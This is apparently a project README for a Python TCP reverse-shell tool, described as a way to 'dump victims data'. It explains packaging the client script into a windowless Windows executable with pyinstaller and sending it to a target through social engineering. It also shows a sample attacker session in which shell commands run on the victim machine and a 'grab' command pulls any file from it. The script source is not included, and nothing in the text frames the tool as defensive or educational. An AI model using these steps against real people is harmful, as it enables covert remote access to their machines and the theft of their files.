# tcp-shell
hacking through tcp reverse shell to dump victims data
HERE i have provided two files 

1)myser.py

its job is to create a tcp server on our system and make a connection from victim

2)mycli.py

its job is to connect to server .mycli.py is a python script so its too weird to execute a python script on target machine

next step invoves changing the mycli.py to exe(executable file) 
it involves a module importing

pyinstaller

to import it:in terminal just type

pip install pyinstaller

pyinstaller -F -w client.py

yahoo next to send the exe to target .it needs some social enginnering skills

o executing methods
  
  python3 myser.py
  
  enter the ip:192.168.43.155 (enter your ip here)
  
  enter the port:8080
  
  [+] listening for incoming connections
  
  [+] connection established ('192.168.43.155', 52902)(when target clicks the exe)
  
  shell>>ipconfig
  
  shell>>terminate(close the connection)
  
  shell>>dir (shows windows diectory)
  
  shell>>grab=(any file on target)

  

  
  

  
  

  

  

